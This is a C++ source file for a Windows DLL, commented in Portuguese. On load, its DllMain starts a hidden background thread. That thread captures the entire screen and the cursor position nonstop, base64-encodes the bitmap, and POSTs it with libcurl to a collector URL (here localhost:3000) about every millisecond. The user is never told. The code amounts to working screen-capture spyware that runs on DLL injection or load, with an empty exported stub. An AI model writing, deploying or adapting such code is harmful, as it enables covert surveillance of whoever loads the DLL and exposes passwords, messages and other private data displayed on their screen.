#define CURL_STATICLIB // Remova ou comente esta linha se estiver usando a DLL do cURL (dinâmico)
#include <windows.h>
#include <iostream>
#include <string>
#include <vector>
#include <cstring> 
#include <curl/curl.h>

extern "C" __declspec(dllexport) void LazuliteInit() {
}

std::string base64_encode(const unsigned char* data, size_t input_length) {
    const char base64_chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::string ret;
    int i = 0;
    int j = 0;
    unsigned char char_array_3[3];
    unsigned char char_array_4[4];

    while (input_length--) {
        char_array_3[i++] = *(data++);
        if (i == 3) {
            char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
            char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
            char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
            char_array_4[3] = char_array_3[2] & 0x3f;
            for (i = 0; i < 4; i++) ret += base64_chars[char_array_4[i]];
            i = 0;
        }
    }

    if (i) {
        for (j = i; j < 3; j++) char_array_3[j] = '\0';
        char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
        char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
        char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
        for (j = 0; j < i + 1; j++) ret += base64_chars[char_array_4[j]];
        while ((i++ < 3)) ret += '=';
    }
    return ret;
}

std::string captureScreenAsBase64() {
    std::string base64_str = "";
    int x = GetSystemMetrics(SM_XVIRTUALSCREEN);
    int y = GetSystemMetrics(SM_YVIRTUALSCREEN);
    int w = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    int h = GetSystemMetrics(SM_CYVIRTUALSCREEN);

    HDC hScreenDC = GetDC(NULL);
    HDC hMemoryDC = CreateCompatibleDC(hScreenDC);
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, w, h);
    HBITMAP hOldBitmap = (HBITMAP)SelectObject(hMemoryDC, hBitmap);

    if (BitBlt(hMemoryDC, 0, 0, w, h, hScreenDC, x, y, SRCCOPY)) {
        BITMAPINFOHEADER bi;
        bi.biSize = sizeof(BITMAPINFOHEADER);
        bi.biWidth = w;
        bi.biHeight = -h;
        bi.biPlanes = 1;
        bi.biBitCount = 24;
        bi.biCompression = BI_RGB;
        bi.biSizeImage = 0;
        bi.biXPelsPerMeter = 0;
        bi.biYPelsPerMeter = 0;
        bi.biClrUsed = 0;
        bi.biClrImportant = 0;

        DWORD dwBmpSize = ((w * bi.biBitCount + 31) / 32) * 4 * h;
        std::vector<unsigned char> bmpBuffer(sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + dwBmpSize);

        BITMAPFILEHEADER bfh;
        bfh.bfType = 0x4D42;
        bfh.bfSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + dwBmpSize;
        bfh.bfReserved1 = 0;
        bfh.bfReserved2 = 0;
        bfh.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);

        std::memcpy(bmpBuffer.data(), &bfh, sizeof(BITMAPFILEHEADER));
        std::memcpy(bmpBuffer.data() + sizeof(BITMAPFILEHEADER), &bi, sizeof(BITMAPINFOHEADER));
        
        GetDIBits(hScreenDC, hBitmap, 0, h, bmpBuffer.data() + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER), (BITMAPINFO*)&bi, DIB_RGB_COLORS);
        
        base64_str = base64_encode(bmpBuffer.data(), bmpBuffer.size());
    }

    SelectObject(hMemoryDC, hOldBitmap);
    DeleteObject(hBitmap);
    DeleteDC(hMemoryDC);
    ReleaseDC(NULL, hScreenDC);

    return base64_str;
}

void executeSinglePost() {
    CURL* curl = curl_easy_init();

    if (curl) {
        POINT p;
        std::string mouse_x = "0";
        std::string mouse_y = "0";

        if (GetCursorPos(&p)) {
            mouse_x = std::to_string(p.x);
            mouse_y = std::to_string(p.y);
        }

        std::string screenshotBase64 = captureScreenAsBase64();

        // Evita enviar strings vazias se a captura falhar
        if (screenshotBase64.empty()) {
            curl_easy_cleanup(curl);
            return;
        }

        std::string info = "{\"mouse_x\": \"" + mouse_x + "\", \"mouse_y\": \"" + mouse_y + "\", \"screenshot\": \"" + screenshotBase64 + "\"}";

        curl_easy_setopt(curl, CURLOPT_URL, "http://localhost:3000/a/");
        curl_easy_setopt(curl, CURLOPT_POST, 1L);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, info.c_str());
        curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, (long)info.length());

        struct curl_slist* headers = NULL;
        headers = curl_slist_append(headers, "Content-Type: application/json");
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 5L); 

        CURLcode res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            // Permite ver o erro no output do debugger (ex: Visual Studio)
            OutputDebugStringA(("cURL Erro: " + std::string(curl_easy_strerror(res)) + "\n").c_str());
        }

        curl_slist_free_all(headers);
        curl_easy_cleanup(curl);
    }
}

DWORD WINAPI BackgroundWorker(LPVOID lpParam) {
    while (true) {
        executeSinglePost();
        Sleep(1); 
    }
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        DisableThreadLibraryCalls(hModule);
        curl_global_init(CURL_GLOBAL_ALL); // Inicializa no carregamento da DLL
        CreateThread(NULL, 0, BackgroundWorker, NULL, 0, NULL);
        break;

    case DLL_PROCESS_DETACH:
        curl_global_cleanup(); // Limpa ao descarregar a DLL
        break;
    }
    return TRUE;
}